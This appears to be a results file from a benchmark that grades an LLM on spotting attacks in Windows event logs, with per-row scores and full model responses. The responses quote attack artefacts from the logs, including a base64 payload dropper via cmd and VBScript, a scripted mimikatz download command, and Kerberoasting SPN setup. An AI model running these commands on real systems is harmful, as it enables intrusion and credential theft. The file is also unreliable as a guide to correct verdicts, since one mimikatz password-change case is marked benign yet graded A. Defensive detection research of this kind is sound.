# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4698-4699-Fast created & deleted task by SMBexec (sups. arg.).evtx,easy,A,processed,YES,100.0,100.0,YES,"4698, 4699",C:\WINDOWS\Temp\MpCmdRun.bat,"admmig, OFFSEC\lambda-user, S-1-5-18",C:\WINDOWS\Temp\MpCmdRun.bat,,,0.0,6.86,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4698, 4699
- Processes: C:\WINDOWS\Temp\MpCmdRun.bat
- Accounts: admmig, OFFSEC\lambda-user, S-1-5-18
- Commands: C:\WINDOWS\Temp\MpCmdRun.bat
- Network: None
- Registry: None

EXPLANATION:
A scheduled task named ""\smbservice"" was created (4698) and immediately deleted (4699) by admmig, executing a batch file masquerading as the legitimate Defender utility (MpCmdRun.bat) from the suspicious C:\WINDOWS\Temp directory under SYSTEM (S-1-5-18). The rapid create-then-delete of a SYSTEM-privileged task running a renamed binary from a temp folder is consistent with persistence/execution and anti-forensic cleanup behavior."
claude-opus-4-8,ID5145-Remote schedule task creation (ATexec).evtx,easy,A,processed,YES,100.0,77.8,YES,5145,,admmig,,10.23.123.11,,0.0,4.55,4.7,5.0,4.0,2,15.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: None
- Accounts: admmig
- Commands: None
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The sequence shows access to the IPC$ share with the named pipe ""atsvc"" (task scheduler) followed by writing and deleting a randomly-named .tmp file (Temp\bouWFQYO.tmp) under ADMIN$\Windows\Temp, a hallmark of remote command execution tools like Impacket's atexec/smbexec. The combination of atsvc pipe access and a temporary file drop on the C$/ADMIN$ share from a single remote IP indicates lateral movement and remote code execution rather than benign file sharing."
claude-opus-4-8,ID4688-SQL Server payload injectection for reverse shell (MSF).evtx,easy,A,processed,YES,100.0,75.0,YES,4688,"cmd.exe, conhost.exe, cscript.exe, sqlservr.exe, TVupu.exe",Svc-SQL-DB01,"""C:\Windows\system32\cmd.exe"" /c echo TVqQAAMAAAAEAAAA...>>%TEMP%\feyQV.b64, cscript //nologo %TEMP%\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe""",,,16.7,10.57,4.5,6.0,3.3,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: cmd.exe, conhost.exe, cscript.exe, sqlservr.exe, TVupu.exe
- Accounts: Svc-SQL-DB01
- Commands: ""C:\Windows\system32\cmd.exe"" /c echo TVqQAAMAAAAEAAAA...>>%TEMP%\feyQV.b64, cscript //nologo %TEMP%\UbdXv.vbs, ""C:\Users\SVC-SQ~1\AppData\Local\Temp\TVupu.exe""
- Network: None
- Registry: None

EXPLANATION:
The SQL Server service account (Svc-SQL-DB01) spawned dozens of cmd.exe processes via sqlservr.exe to echo base64 chunks (starting with the ""TVqQAA"" MZ/PE header) into %TEMP%\feyQV.b64, a classic xp_cmdshell-based fileless dropper technique indicating SQL injection/compromise. A VBScript (UbdXv.vbs) was then built to base64-decode the file into TVupu.exe, which was executed — completing the chain to drop and run an unsigned binary. This sequential, scripted decode-and-execute pattern launched from a database engine is clear malicious post-exploitation activity."
claude-opus-4-8,ID4688-Edge payload download via command.evtx,easy,A,processed,YES,100.0,75.7,YES,4688,"msedge.exe, timeout.exe, SecurityHealthHost.exe, taskkill.exe, cmd.exe, svchost.exe","admmig, WIN10-02$","""C:\Program Files\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip, timeout  3, taskkill  /IM ""msedge.exe"" /F",github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip,,0.0,5.76,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: msedge.exe, timeout.exe, SecurityHealthHost.exe, taskkill.exe, cmd.exe, svchost.exe
- Accounts: admmig, WIN10-02$
- Commands: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip, timeout  3, taskkill  /IM ""msedge.exe"" /F
- Network: github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip
- Registry: None

EXPLANATION:
A cmd.exe parent automatically launched msedge.exe to download the mimikatz credential-dumping tool from GitHub, then used timeout to wait and taskkill to forcibly close the browser, indicating a scripted, automated download of a known hacking tool. This sequence of scripted browser invocation, deliberate delay, and forced termination by the same actor (admmig) is consistent with attacker tooling acquisition rather than normal user browsing."
claude-opus-4-8,ID5145-remote service creation over SMB.evtx,easy,A,processed,YES,100.0,77.8,YES,5145,powershell.exe,admmig,,10.23.123.11,,0.0,3.75,4.7,6.0,4.0,4,18.7,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: powershell.exe
- Accounts: admmig
- Commands: None
- Network: 10.23.123.11
- Registry: None

EXPLANATION:
The same actor (admmig from 10.23.123.11) accessed the ADMIN$ share to reach powershell.exe and then accessed the IPC$ share targeting the svcctl named pipe, which is the service control manager interface. This combination of ADMIN$ file access plus svcctl pipe access is the classic signature of remote service-based lateral movement (PsExec-style execution), indicating malicious activity rather than routine file sharing."
claude-opus-4-8,ID5145-service massive remote creation via named pipe - Tchopper.evtx,easy,A,processed,YES,100.0,83.3,YES,5145,svcctl,admmig,,10.23.23.9,,0.0,6.06,5.0,5.0,4.0,3,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5145
- Processes: svcctl
- Accounts: admmig
- Commands: None
- Network: 10.23.23.9
- Registry: None

EXPLANATION:
A single source (10.23.23.9) repeatedly accesses the IPC$ share targeting the ""svcctl"" named pipe (Service Control Manager) using account admmig, with each access generating a new logon session ID at a steady ~1.5 second cadence over several minutes. This sustained, automated pattern of remote svcctl access is consistent with lateral movement / remote service manipulation (e.g., PsExec-style or service-creation tooling) rather than routine administrative activity, and the high-volume repetition indicates scripted abuse."
claude-opus-4-8,"ID7000,7009,7045-Payload deployed via service - Tchopper.evtx",medium,A,processed,YES,100.0,66.7,YES,"7045, 7009, 7000, 7036","cmd.exe, powershell.exe",LocalSystem,"c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt""",,,16.7,8.26,4.0,5.0,3.3,3,15.3,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 7009, 7000, 7036
- Processes: cmd.exe, powershell.exe
- Accounts: LocalSystem
- Commands: c:\windows\system32\cmd.exe /c powershell -command ""Get-Service ""seg1"" | select -Expand DisplayName |out-file -append tmp_payload.txt""
- Network: None
- Registry: None

EXPLANATION:
Hundreds of services (Event ID 7045) were rapidly installed under LocalSystem with base64-encoded ServiceNames and identical cmd.exe/powershell ImagePaths appending output to tmp_payload.txt, each failing to start (7009/7000 errors). This pattern of abusing Service Control Manager to smuggle a large PowerShell script in chunked Base64 service-name fields is a covert data-staging/exfiltration technique, not legitimate administrative activity."
claude-opus-4-8,ID7009-Service deployment time out (meterpreter).evtx,easy,B,processed,YES,100.0,100.0,YES,7009,,,,,,0.0,3.80,6.0,4.0,4.0,2,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7009, 7009, 7009
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Multiple Event ID 7009 (service timeout) entries on FS03.offsec.lan reference randomly-named services (gdKhvCScykzNFZKd, JyZPMMxJQxHFDMHV, ItUrroruwhZwMrnl) created within minutes of each other. These pseudo-random 16-character service names are characteristic of remote execution tools like PsExec/Impacket that create temporary services, indicating likely lateral movement or remote command execution rather than legitimate service activity."
claude-opus-4-8,ID33205-SQL Server member added to database role.evtx,easy,A,processed,NO,100.0,100.0,YES,33205,,"OFFSEC\admmig, test-sql, dbo, db_accessadmin",ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql,mssql01.offsec.lan,,0.0,6.47,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, test-sql, dbo, db_accessadmin
- Commands: ALTER ROLE [db_accessadmin] ADD MEMBER [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
This is a single SQL Server audit event (action_id:APRL) showing the administrator OFFSEC\admmig adding the principal test-sql to the db_accessadmin role, a routine database administration task. The action succeeded and was performed by an admin account through normal role management, with no privilege-escalation chain or anomalous paired state changes present. Absent additional context indicating abuse, this represents standard role assignment activity."
claude-opus-4-8,ID33205-SQL Server member added to server role.evtx,easy,A,processed,YES,100.0,68.8,YES,33205,,"OFFSEC\admmig, test-sql, dbo",ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql,,,0.0,4.09,4.1,6.0,4.0,4,18.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 33205
- Processes: None
- Accounts: OFFSEC\admmig, test-sql, dbo
- Commands: ALTER SERVER ROLE [sysadmin] ADD MEMBER [test-sql]
- Network: None
- Registry: None

EXPLANATION:
The event shows OFFSEC\admmig successfully adding the principal [test-sql] to the high-privilege sysadmin server role via an ALTER SERVER ROLE statement (action APRL, succeeded:true). Granting sysadmin membership to a generically-named account is a classic privilege-escalation and persistence technique on SQL Server. This warrants investigation as malicious behavior."
claude-opus-4-8,ID33205-SQL Server user linked to a database.evtx,easy,A,processed,NO,100.0,88.9,YES,33205,MSSQL$RADAR,"OFFSEC\admmig, dbo, test-sql",CREATE USER [test-sql] FOR LOGIN [test-sql,mssql01.offsec.lan,,0.0,5.44,5.3,5.0,4.0,2,16.3,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 33205
- Processes: MSSQL$RADAR
- Accounts: OFFSEC\admmig, dbo, test-sql
- Commands: CREATE USER [test-sql] FOR LOGIN [test-sql]
- Network: mssql01.offsec.lan
- Registry: None

EXPLANATION:
This is a SQL Server audit event (action_id:CR, class_type:SU) recording the successful creation of a database user mapped to an existing login, performed by an administrative principal (OFFSEC\admmig). This is a routine database administration task with no indicators of privilege escalation, suspicious commands, or unauthorized access. The single, succeeded user-creation event by an admin account reflects normal provisioning activity."
claude-opus-4-8,ID4688-SPN added to an account.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe","lambda-user, offsec\honey-pot1","SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*",HACK-ME-PC.offsec.lan,,0.0,4.60,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688, 4688
- Processes: C:\Windows\System32\setspn.exe, C:\Windows\System32\cmd.exe
- Accounts: lambda-user, offsec\honey-pot1
- Commands: SetSPN  -a MSSQLSvc/HACK-ME-PC.offsec.lan offsec\honey-pot1, setspn  -T offsec -Q */*
- Network: HACK-ME-PC.offsec.lan
- Registry: None

EXPLANATION:
The same user (lambda-user) registered an MSSQLSvc SPN on an account and then enumerated all SPNs across the domain with ""setspn -T offsec -Q */*"", which is the classic reconnaissance step preceding a Kerberoasting attack. Setting an SPN on a user account followed immediately by domain-wide SPN enumeration indicates an attacker preparing to request and crack service tickets rather than routine administration."
claude-opus-4-8,ID4723-5145-password reset with changeNTLM (Mimikatz).evtx,easy,A,processed,NO,100.0,100.0,YES,4723,,"hacker2, admmig",,,,0.0,4.18,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4723
- Processes: None
- Accounts: hacker2, admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 4723 indicates an attempt by an account (admmig) to change the password of another account (hacker2), which is a routine administrative action on a domain controller. There is no privilege escalation chain, paired suspicious state change, or sequence of malicious commands evident in this single event. Without additional context showing unauthorized access or anomalous behavior, this activity appears benign."
claude-opus-4-8,ID4724-5145-password reset with setNTLM (Mimikatz).evtx,easy,A,processed,YES,100.0,88.9,YES,"4624, 5145, 4724, 4738",,"admmig, hacker2, ROOTDC1$",,"10.23.23.9, fe80::1cae:5aa4:9d8d:106a",,0.0,4.78,5.3,5.0,4.0,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4624, 5145, 4724, 4738
- Processes: None
- Accounts: admmig, hacker2, ROOTDC1$
- Commands: None
- Network: 10.23.23.9, fe80::1cae:5aa4:9d8d:106a
- Registry: None

EXPLANATION:
The account admmig logs on remotely via Kerberos (LogonType 3) from 10.23.23.9, accesses the IPC$ share with the SAMR named pipe, then performs a password reset (4724) and account change (4738) on the account hacker2 within milliseconds. This sequence of remote SAMR access followed by a password reset on another account is consistent with credential manipulation/privilege abuse against a domain controller rather than routine administration."
